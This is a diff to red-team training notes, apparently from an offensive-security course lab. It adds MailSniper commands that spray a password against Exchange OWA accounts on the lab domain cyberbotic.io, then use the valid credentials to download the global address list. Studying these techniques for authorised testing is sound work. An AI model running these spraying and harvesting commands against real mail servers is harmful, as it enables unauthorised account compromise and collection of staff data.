@@ -67,10 +67,23 @@ Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
 ```
 Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
 ```
- 
+
+MailSniper can spray passwords against the valid account(s) identified using, Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS).
+
+```
+PS C:\Users\Attacker> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
+```
+
+
  > [!OPSEC]
  > In the real world, be aware that these authentication attempts may count towards the domain lockout policy for the users.  Too many attempts in a short space of time are not only loud but may also lock accounts out.
 >  
  
  
+We can do further actions using MailSniper with valid credentials, such as downloading the global address list.
 
+```
+PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
+```
+
+## Phishing
